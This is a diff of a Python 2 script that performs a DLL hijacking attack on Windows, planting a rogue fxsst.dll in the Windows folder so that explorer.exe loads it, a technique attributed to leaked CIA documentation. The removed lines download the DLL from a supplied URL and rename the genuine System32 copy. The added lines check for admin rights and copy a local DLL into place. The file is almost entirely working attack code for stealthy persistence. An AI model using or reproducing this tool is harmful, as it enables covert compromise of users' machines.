@@ -1,44 +1,41 @@
 """
-https://wikileaks.org/ciav7p1/cms/page_2621760.html
-	
-This is a simple DLL hijacking attack that we have successfully tested against
-Windows XP,Vista and 7. A DLL named fxsst.dll normally resides in \Windows\System32
-and is loaded by explorer.exe. Placing a new DLL with this name in \Windows results
-in this being loaded into explorer instead of the original DLL. On Windows Vista
-and above, the DLL's reference count must be increased by calling LoadLibrary
-on itself to avoid being unloaded. This achieves persistence, stealth and in some
-cases PSP avoidance.
+Works from: Windows XP
+Fixed in: Windows 8
 """
 import os
-import psutil
-import requests
+import shutil
+import ctypes
+from colorama import init, Fore
+init(convert=True)
 
-def fax_dll_hijack(url,rename_dll):
-	dll = "fxsst.dll"
-	dll_drop = "C:\Windows"
-	dll_path = "C:\Windows\System32"
+dll_name = "fxsst.dll"
+dll_drop = "c:\windows"
 
-	for process in psutil.process_iter():
-		if "explorer.exe" in str(process.name):
-			for loaded_dlls in psutil.Process(process.pid).memory_maps():
-				if dll in loaded_dlls.path:	
-					if (rename_dll == 1):
-						if (os.path.isfile(os.path.join(dll_path,dll)) == True):
-							try:
-								os.rename(os.path.join(dll_path,dll),os.path.join(dll_path,"fxsst.dll.old"))
-							except Exception as e:
-								return False
-					try:
-						download = requests.get(url)
-						if (len(download.content) > 1):
-							with open(os.path.join(dll_drop,dll),"wb") as dll_file:
-								dll_file.write(download.content)
-								dll_file.close()
-							if (os.path.isfile(os.path.join(dll_drop,dll)) == True):
-									pass
-							else:
-								return False
-						else:
-							return False
-					except Exception as e:
-						return False
+def successBox():
+	return (Fore.GREEN + '[+]' + Fore.RESET)
+
+def errorBox():
+	return (Fore.RED + '[-]' + Fore.RESET)
+
+def infoBox():
+	return (Fore.CYAN + '[!]' + Fore.RESET)	
+
+def warningBox():
+	return (Fore.YELLOW + '[!]' + Fore.RESET)
+
+def fax_dll_hijack():
+	print " {} fax_dll_hijack: Attempting to copy: {} to: {} in order to dll hijack explorer".format(infoBox(),dll_name,dll_drop)
+	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
+		print " {} fax_dll_hijack: We are running as admin, we can proceed".format(infoBox())
+		try:
+			shutil.copy(dll_name,dll_drop)
+			print " {} fax_dll_hijack: Successfully copied: {} to: {}".format(successBox(),dll_name,dll_drop)
+		except shutil.Error as error:
+			print " {} fax_dll_hijack: Unable to copy: {}".format(errorBox(),dll_name)
+			return False
+		except IOError as error:
+			print " {} fax_dll_hijack: Unable to copy: {}".format(errorBox(),dll_name)
+			return False
+	else:
+		print " {} fax_dll_hijack: We are not admin, cannot proceed".format(errorBox())
+		return False
